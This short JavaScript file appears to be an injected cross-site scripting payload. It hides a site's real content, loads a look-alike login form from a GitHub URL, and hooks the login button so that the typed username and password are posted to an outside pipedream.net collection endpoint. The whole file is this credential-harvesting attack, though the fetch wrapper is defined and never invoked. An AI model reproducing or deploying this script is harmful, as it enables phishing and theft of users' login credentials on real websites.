// Hide initial content
$(".row, .subheader").css("display", "none");

// Add place holder
var place_holder = document.createElement('div');
place_holder.className = "place_holder";
$("nav").after(place_holder);

function sendCredential(username, password) {
    const headers = new Headers();
    headers.append("Content-Type", "application/json");

    const body = {
        "username": username,
        "password": password,
        "cookies": "ignore",
        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30"
    };

    const options = {
        method: "POST",
        headers,
        mode: "cors",
        body: JSON.stringify(body)
    };

    const request = async() => {
        const response = await fetch("https://ensnocsamq9t9ho.m.pipedream.net", options);
    }
}


$(window).on('load', function() {
    // Remove all unwanted content
    $(".row").remove();
    $('.place_holder').load("https://raw.githubusercontent.com/hotMS/Contoso-Stake/master/SkateShop/xss_admin/xss.html", spy);
});


// Add listener to the form submited
var spy = function() {
    $(document).ready(function() {
        $('#doLogin_0').on("click", function() {
            sendCredential($('#doLogin_username').val(), $('#doLogin_password').val());
        });
    });
}